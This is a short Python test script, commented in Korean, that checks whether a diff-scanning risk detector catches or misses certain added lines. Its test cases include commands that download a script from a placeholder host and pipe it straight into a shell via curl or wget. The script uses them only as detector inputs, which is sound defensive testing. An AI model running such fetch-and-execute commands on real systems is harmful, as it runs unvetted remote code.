#!/usr/bin/env python3
"""PM 교차검증: 브라이언 D-Q1(오탐)·D-Q2(미탐) 주장을 직접 재현."""
import sys, os
sys.path.insert(0, "/opt/data/projects/cc-plugin/runs/run_Oz3JuL")
import diff_digest

def mkdiff(added_line):
    return ("diff --git a/x.sh b/x.sh\n--- a/x.sh\n+++ b/x.sh\n"
            "@@ -1,0 +1,1 @@\n+" + added_line + "\n")

cases = {
    "curl 공백1개 | sh (기존 정상 케이스)": "curl http://x.io/i.sh | sh",
    "curl 공백2개 |  sh (D-Q2 미탐 의심)": "curl http://x.io/i.sh |  sh",
    "wget | sh (D-Q2 미탐 의심)":         "wget http://x.io/i.sh | sh",
    "import subprocess (D-Q1 오탐 의심)": "import subprocess",
}
print("=== D-Q1/D-Q2 재현 ===")
for name, line in cases.items():
    risks = diff_digest.scan_risks(mkdiff(line))
    hit = len(risks) > 0
    pats = [r["pattern"] for r in risks]
    print(f"  [{'HIT' if hit else 'MISS'}] {name}")
    if hit: print(f"        → {pats}")

print("\n=== 판정 ===")
# D-Q2: curl 공백2개 / wget 은 위험인데 MISS면 결함
r_curl2 = diff_digest.scan_risks(mkdiff("curl http://x.io/i.sh |  sh"))
r_wget = diff_digest.scan_risks(mkdiff("wget http://x.io/i.sh | sh"))
r_imp = diff_digest.scan_risks(mkdiff("import subprocess"))
dq2_curl = "확인됨(미탐 결함)" if not r_curl2 else "반증(잡음)"
dq2_wget = "확인됨(미탐 결함)" if not r_wget else "반증(잡음)"
dq1 = "확인됨(오탐)" if r_imp else "반증"
print(f"  D-Q2 curl 공백2개: {dq2_curl}")
print(f"  D-Q2 wget|sh:      {dq2_wget}")
print(f"  D-Q1 import subprocess 오탐: {dq1}")
